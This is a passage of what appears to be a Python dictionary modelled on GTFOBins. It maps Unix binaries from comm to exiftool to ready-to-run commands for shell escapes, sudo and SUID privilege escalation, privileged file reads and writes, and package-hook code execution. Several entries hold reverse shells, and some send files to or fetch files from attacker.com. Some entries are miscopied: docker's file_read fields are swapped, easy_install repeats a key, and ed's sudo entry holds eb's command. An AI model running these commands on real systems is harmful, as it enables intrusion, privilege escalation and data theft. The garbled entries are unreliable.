            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which comm) .\n\nLFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null"}}
            },
    'cowsay':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowsay -f $TF x"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x"}}
            },
    'cowthink':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowthink -f $TF x"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x"}}
            },
    'cp':{
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\necho \"DATA\" | cp /dev/stdin \"$LFILE\""}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ncp \"$LFILE\" /dev/stdout"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which cp) .\n\nLFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\"",
                '2':"sudo install -m =xs $(which cp) .\n\nLFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF $LFILE",
                '3':"sudo install -m =xs $(which cp) .\n\nLFILE=file_to_change\n./cp --attributes-only --preserve=all ./cp \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"",
                '2':"LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE",
                '3':"sudo cp /bin/sh /bin/cp\nsudo cp"}},
            },
    'cpan':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"cpan\n! exec '/bin/bash'"}},
        'reverse_shell':{
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=localhost\nexport RPORT=9000\ncpan\n! use Socket; my $i=\"$ENV{RHOST}\"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};"}},
        'file_upload':{
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"cpan\n! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();"}},
        'file_download':{
            'info':'It can download remote files.',
            'exploits':{
                '1':"export URL=http://attacker.com/file_to_get\ncpan\n! use File::Fetch; my $file = (File::Fetch->new(uri => \"$ENV{URL}\"))->fetch();"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo cpan\n! exec '/bin/bash'"}}
            },
    'cpio':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | cpio -up $LDIR"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\necho \"$LFILE\" | cpio -o",
                '2':"LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | cpio -dp $TF\ncat \"$TF/$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which cpio) .\n\nLFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | ./cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"",
                '2':"sudo install -m =xs $(which cpio) .\n\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | ./cpio -R 0:0 -p $LDIR"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:",
                '2':"LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | sudo cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"",
                '3':"LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | sudo cpio -R 0:0 -p $LDIR"}}
            },
    'cpulimit':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"cpulimit -l 100 -f /bin/sh"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which cpulimit) .\n\n./cpulimit -l 100 -f -- /bin/sh -p"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo cpulimit -l 100 -f /bin/sh"}}
            },
    'crash':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"crash -h\n!sh"}},
        'command':{
            'info':'It can be used to break out from restricted environments by running non-interactive system commands.',
            'exploits':{
                '1':"COMMAND='/usr/bin/id'\nCRASHPAGER=\"$COMMAND\" crash -h"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo crash -h\n!sh"}}
            },
    'crontab':{
        'command':{
            'info':'It can be used to break out from restricted environments by running non-interactive system commands.',
            'exploits':{
                '1':"crontab -e"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo crontab -e"}}
            },
    'csh':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"csh"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which csh) .\n\n./csh -b"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo csh"}}
            },
    'csplit':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which csplit) .\n\nLFILE=file_to_read\ncsplit $LFILE 1\ncat xx01"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01"}}
            },
    'csvtool':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"csvtool call '/bin/sh;false' /etc/passwd"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\ncsvtool trim t $TF -o $LFILE"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ncsvtool trim t $LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which csvtool) .\n\nLFILE=file_to_read\n./csvtool trim t $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo csvtool call '/bin/sh;false' /etc/passwd"}}
            },
    'cupsfilter':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ncupsfilter -i application/octet-stream -m application/octet-stream $LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which cupsfilter) .\n\nLFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE"}}
            },
    'curl':{
        'file_upload':{
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"URL=http://attacker.com/\nLFILE=file_to_send\ncurl -X POST -d @$file_to_send $URL"}},
        'file_download':{
            'info':'It can download remote files.',
            'exploits':{
                '1':"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\ncurl $URL -o $LFILE"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\"curl \"file://$TF\" -o \"$LFILE\""}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=/tmp/file_to_read\ncurl file://$LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which cupsfilter) .\n\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE"}}
            },
    'cut':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ncut -d \"\" -f1 \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which cut) .\n\nLFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\""}}
            },
    'dash':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"dash"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"export LFILE=file_to_write\ndash -c 'echo DATA > $LFILE'"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which dash) .\n\n./dash -p"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo dash"}}
            },
    'date':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ndate -f $LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which date) .\n\nLFILE=file_to_read\n./date -f $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo date -f $LFILE"}}
            },
    'dd':{
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\necho \"DATA\" | dd of=$LFILE"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ndd if=$LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which dd) .\n\nLFILE=file_to_write\necho \"data\" | ./dd of=$LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE"}}
            },
    'dialog':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ndialog --textbox \"$LFILE\" 0 0"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which dialog) .\n\nLFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0"}}
            },
    'diff':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which diff) .\n\nLFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE"}}
            },
    'dig':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ndig -f $LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which dig) .\n\nLFILE=file_to_read\n./dig -f $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo dig -f $LFILE"}}
            },
    'dmesg':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"dmesg -H\n!/bin/sh"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ndmesg -rF \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo dmesg -H\n!/bin/sh"}}
            },
    'dmidecode':{
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"make dmiwrite\nTF=$(mktemp)\necho \"DATA\" > $TF\n./dmiwrite $TF x.dmi",
                '2':"LFILE=file_to_write\nsudo dmidecode --no-sysfs -d x.dmi --dump-bin \"$LFILE\""}}
            },
    'dmsetup':{
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which dmsetup) .\n\n./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'"}}
            },
    'dnf':{
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF",
                '2':"sudo dnf install -y x-1.0-1.noarch.rpm"}}
            },
    'docker':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"docker run -v /:/mnt --rm -it alpine chroot /mnt sh"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"CONTAINER_ID=\"$(docker run -d alpine)\" # or existing\nTF=$(mktemp)\necho \"DATA\" > $TF\ndocker cp $TF $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF file_to_write"}},
        'file_read':{
            'info':'CONTAINER_ID="$(docker run -d alpine)"  # or existing\nTF=$(mktemp)\ndocker cp file_to_read $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF $TF\ncat $TF',
            'exploits':{
                '1':"LFILE=file_to_read\ndmesg -rF \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which docker) .\n\n./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"}},
            },
    'dpkg':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"dpkg -l\n!/bin/sh"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo dpkg -l\n!/bin/sh",
                '2':"TF=$(mktemp -d)\necho 'exec /bin/sh' > $TF/x.sh\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n\nsudo dpkg -i x_1.0_all.deb"}}
            },
    'dvips':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"tex '\special{psfile=\"`/bin/sh 1>&0\"}\end'\ndvips -R0 texput.dvi"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"tex '\special{psfile=\"`/bin/sh 1>&0\"}\end'\nsudo dvips -R0 texput.dvi"}},
        'limited_suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which dvips) .\n\ntex '\special{psfile=\"`/bin/sh 1>&0\"}\end'\n./dvips -R0 texput.dvi"}}
            },
    'easy_install':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\neasy_install $TF"}},
        'reverse_shell':{
            'info':'Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\neasy_install $TF"}},
        'file_upload':{
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"export URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py\neasy_install $TF",
                '2':"export LPORT=8888\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py\neasy_install $TF"}},
        'file_download':{
            'info':'It can download remote files.',
            'exploits':{
                '1':"export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', '$(whereis python)', '-c', \"\"\"import sys;\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve('$URL', '$LFILE')\"\"\")\" > $TF/setup.py\npip install $TF"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', 'python', '-c', 'open(\"$LFILE\",\"w+\").write(\"DATA\")')\" > $TF/setup.py\neasy_install $TF"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho 'print(open(\"file_to_read\").read())' > $TF/setup.py\neasy_install $TF"}},
        'file_read':{
            'info':'It loads shared libraries that may be used to run code in the binary execution context.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\neasy_install $TF"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF"}},
            },
    'eb':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"eb logs\n!/bin/sh"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo eb logs\n!/bin/sh"}}
            },
    'ed':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"ed\n!/bin/sh"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"ed file_to_write\na\nDATA\n.\nw\nq"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which ed) .\n\n./ed file_to_read\n,p\nq"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo eb logs\n!/bin/sh"}},
        'limited_suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which ed) .\n\n./ed\n!/bin/sh"}},
            },
    'emacs':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"emacs -Q -nw --eval '(term \"/bin/sh\")'"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"emacs file_to_write\nDATA\nC-x C-s"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"emacs file_to_read"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which emacs) .\n\n./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"}},
            },
    'env':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"env /bin/sh"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which env) .\n\n./env /bin/sh -p"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo env /bin/sh"}},
            },
    'eqn':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\neqn \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which eqn) .\n\nLFILE=file_to_read\n./eqn \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo eqn \"$LFILE\""}},
            },
    'ex':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"ex\n!/bin/sh"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"ex file_to_write\na\nDATA\n.\nw\nq"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"ex file_to_read\n,p\nq"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo ex\n!/bin/sh"}},
            },
    'exiftool':{
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\nINPUT=input_file\nexiftool -filename=$LFILE $INPUT"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nOUTPUT=output_file\nexiftool -filename=$OUTPUT $LFILE\ncat $OUTPUT"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
